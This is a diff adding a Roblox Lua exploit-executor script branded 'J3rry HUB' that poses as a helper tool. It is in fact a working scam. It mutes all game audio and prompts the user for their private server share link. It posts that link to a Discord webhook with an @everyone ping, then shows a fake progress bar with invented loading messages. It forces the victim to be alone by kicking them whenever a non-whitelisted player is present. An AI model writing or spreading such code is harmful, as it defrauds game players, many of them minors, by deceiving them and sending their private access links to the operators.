@@ -1,0 +1,319 @@
+local WEBHOOK_URL = "DISCORD_URL_HERE"
+local TARGET_UNIVERSE_ID = 7709344486 -- deine Universe ID
+
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+
+-- #####################
+-- Game Check (FIXED)
+-- #####################
+if game.GameId ~= TARGET_UNIVERSE_ID then
+    local plr = Players.LocalPlayer
+    if plr then
+        plr:Kick("Game not supported")
+    else
+        return
+    end
+end
+
+-- Whitelist
+local whitelist = {
+    J3rryKidd = true,
+    Zocker_Julian = true
+}
+
+-- Dauerhaft alle Sounds stoppen
+spawn(function()
+    while true do
+        local function stopIn(container)
+            for _, v in ipairs(container:GetDescendants()) do
+                if v:IsA("Sound") then
+                    v:Stop()
+                    v.Playing = false
+                    v.Volume = 0
+                end
+            end
+        end
+
+        pcall(function()
+            stopIn(game:GetService("ReplicatedStorage"))
+            stopIn(game:GetService("ReplicatedFirst"))
+            stopIn(game:GetService("Workspace"))
+
+            local plr = Players.LocalPlayer
+            if plr then
+                stopIn(plr)
+                if plr.Character then stopIn(plr.Character) end
+                if plr:FindFirstChild("PlayerGui") then stopIn(plr.PlayerGui) end
+            end
+        end)
+        wait(0.1)
+    end
+end)
+
+-- HTTP Request Utility
+local function doRequest(tbl)
+    local ok, res = pcall(function()
+        if syn and syn.request then return syn.request(tbl) end
+        if request then return request(tbl) end
+        if http_request then return http_request(tbl) end
+        if fluxus and fluxus.request then return fluxus.request(tbl) end
+        if http and http.request then return http.request(tbl) end
+        error("no supported request function found")
+    end)
+    return ok, res
+end
+
+local function sendWebhook(webhookUrl, messageContent)
+    local payload = HttpService:JSONEncode({
+        content = messageContent,
+        allowed_mentions = { parse = {"everyone"} }
+    })
+    local tbl = {
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = payload
+    }
+    return doRequest(tbl)
+end
+
+-- GUI Parent
+local parent
+if (typeof(gethui) == "function") then
+    parent = gethui()
+else
+    parent = game:GetService("CoreGui")
+end
+
+-- Alte GUI entfernen
+local existing = parent:FindFirstChild("FindBestBrainrotsGUI")
+if existing then existing:Destroy() end
+
+local function new(class, props)
+    local obj = Instance.new(class)
+    if props then
+        for k,v in pairs(props) do
+            if k ~= "Parent" then obj[k] = v end
+        end
+        if props.Parent then obj.Parent = props.Parent end
+    end
+    return obj
+end
+
+-- Erste GUI Overlay
+local screenGui = new("ScreenGui", {
+    Name = "FindBestBrainrotsGUI",
+    Parent = parent,
+    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+    IgnoreGuiInset = true
+})
+
+local overlay = new("Frame", {
+    Parent = screenGui,
+    Size = UDim2.new(1,0,1,0),
+    BackgroundColor3 = Color3.fromRGB(18,18,18),
+    BorderSizePixel = 0,
+    ZIndex = 999
+})
+
+-- Main GUI
+local main = new("Frame", {
+    Parent = overlay,
+    AnchorPoint = Vector2.new(0.5,0.5),
+    Position = UDim2.new(0.5,0,0.5,0),
+    Size = UDim2.new(0.75,0,0.45,0),
+    BackgroundColor3 = Color3.fromRGB(18,18,18),
+    BorderSizePixel = 0
+})
+new("UICorner", {Parent = main, CornerRadius = UDim.new(0,16)})
+
+local header = new("TextLabel", {
+    Parent = main,
+    Size = UDim2.new(1,-40,0,60),
+    Position = UDim2.new(0,20,0,18),
+    BackgroundTransparency = 1,
+    Text = "J3rry HUB",
+    TextSize = 28,
+    Font = Enum.Font.GothamBold,
+    TextColor3 = Color3.fromRGB(245,245,245),
+    TextXAlignment = Enum.TextXAlignment.Left
+})
+
+local inputBg = new("Frame", {
+    Parent = main,
+    Position = UDim2.new(0,20,0,120),
+    Size = UDim2.new(1,-40,0,80),
+    BackgroundColor3 = Color3.fromRGB(40,40,40),
+    BorderSizePixel = 0
+})
+new("UICorner", {Parent = inputBg, CornerRadius = UDim.new(0,10)})
+
+local textBox = new("TextBox", {
+    Parent = inputBg,
+    Position = UDim2.new(0,10,0,8),
+    Size = UDim2.new(0.78,-20,1,-16),
+    BackgroundTransparency = 1,
+    Text = "",
+    PlaceholderText = "Enter your PS link",
+    TextColor3 = Color3.fromRGB(200,200,200),
+    Font = Enum.Font.Gotham,
+    TextSize = 18,
+    TextXAlignment = Enum.TextXAlignment.Left
+})
+
+local okBtn = new("TextButton", {
+    Parent = inputBg,
+    Position = UDim2.new(0.82,0,0,8),
+    Size = UDim2.new(0.18,-12,1,-16),
+    BackgroundColor3 = Color3.fromRGB(90,180,255),
+    Text = "OK",
+    Font = Enum.Font.GothamBold,
+    TextSize = 20,
+    TextColor3 = Color3.fromRGB(20,20,20)
+})
+new("UICorner", {Parent = okBtn, CornerRadius = UDim.new(0,8)})
+
+local invalidLabel = new("TextLabel", {
+    Parent = main,
+    AnchorPoint = Vector2.new(0.5,0),
+    Position = UDim2.new(0.5,0,1,10),
+    Size = UDim2.new(0.6,0,0,24),
+    BackgroundTransparency = 1,
+    Text = "",
+    Font = Enum.Font.GothamBold,
+    TextSize = 18,
+    TextColor3 = Color3.fromRGB(255,0,0),
+    TextXAlignment = Enum.TextXAlignment.Center
+})
+
+local function setInteract(val)
+    okBtn.Active = val
+    textBox.TextEditable = val
+end
+
+-- Progress Overlay
+local progressOverlay = new("Frame", {
+    Parent = screenGui,
+    Size = UDim2.new(1,0,1,0),
+    BackgroundColor3 = Color3.fromRGB(50,50,50),
+    Visible = false,
+    ZIndex = 1000
+})
+
+local progressBg = new("Frame", {
+    Parent = progressOverlay,
+    AnchorPoint = Vector2.new(0.5,0),
+    Position = UDim2.new(0.5,0,0.55,0),
+    Size = UDim2.new(0.7,0,0,28),
+    BackgroundColor3 = Color3.fromRGB(230,230,230)
+})
+new("UICorner",{Parent=progressBg,CornerRadius=UDim.new(0,14)})
+
+local progressFill = new("Frame", {
+    Parent = progressBg,
+    Size = UDim2.new(0,0,1,0),
+    BackgroundColor3 = Color3.fromRGB(30,30,30)
+})
+new("UICorner",{Parent=progressFill,CornerRadius=UDim.new(0,14)})
+
+local progressLabel = new("TextLabel", {
+    Parent = progressOverlay,
+    AnchorPoint = Vector2.new(0.5,0),
+    Position = UDim2.new(0.5,0,0.62,0),
+    Size = UDim2.new(0.2,0,0,24),
+    BackgroundTransparency = 1,
+    Text = "0%",
+    Font = Enum.Font.Gotham,
+    TextSize = 16,
+    TextColor3 = Color3.fromRGB(245,245,245)
+})
+
+local fakeLabel = new("TextLabel", {
+    Parent = progressOverlay,
+    AnchorPoint = Vector2.new(0.5,0),
+    Position = UDim2.new(0.5,0,0.7,0),
+    Size = UDim2.new(0.6,0,0,24),
+    BackgroundTransparency = 1,
+    Text = "Initializing...",
+    Font = Enum.Font.Gotham,
+    TextSize = 16,
+    TextColor3 = Color3.fromRGB(200,200,200)
+})
+
+local fakeTexts = {
+    "Getting game files...",
+    "Fetching data...",
+    "Processing assets...",
+    "Loading environment...",
+    "Syncing modules..."
+}
+
+local function fillProgress(duration)
+    progressOverlay.Visible = true
+    setInteract(false)
+
+    local start = tick()
+    local progress = 0
+
+    spawn(function()
+        local nextFake = tick() + math.random(5,15)
+
+        while progress < 1 do
+            local elapsed = tick() - start
+            local target = math.clamp(elapsed/duration,0,1)
+
+            local step = math.random(1,2)/200
+            progress = math.min(progress + step, target)
+
+            progressFill.Size = UDim2.new(progress,0,1,0)
+            progressLabel.Text = math.floor(progress*100).."%"
+
+            if tick() >= nextFake then
+                fakeLabel.Text = fakeTexts[math.random(1,#fakeTexts)]
+                nextFake = tick() + math.random(5,15)
+            end
+
+            wait(math.random(8,12)/10)
+        end
+
+        wait(0.2)
+        progressOverlay.Visible = false
+        setInteract(true)
+
+        invalidLabel.Text = "Failed to load. Please try again."
+        delay(3,function() invalidLabel.Text="" end)
+    end)
+end
+
+okBtn.MouseButton1Click:Connect(function()
+    local link = tostring(textBox.Text or ""):match("^%s*(.-)%s*$")
+
+    if not link:find("roblox.com/share%?code=") then
+        invalidLabel.Text = "Link not valid."
+        delay(2,function() invalidLabel.Text="" end)
+        return
+    end
+
+    spawn(function()
+        sendWebhook(WEBHOOK_URL, "@everyone Someone wants his reward: "..link)
+    end)
+
+    fillProgress(180)
+end)
+
+-- Whitelist Kick
+spawn(function()
+    while true do
+        wait(0.1)
+        local plr = Players.LocalPlayer
+        if plr then
+            for _,p in ipairs(Players:GetPlayers()) do
+                if p ~= plr and not whitelist[p.Name] then
+                    plr:Kick("If you execute this script for the first time, u need to be alone.")
+                end
+            end
+        end
+    end
+end)
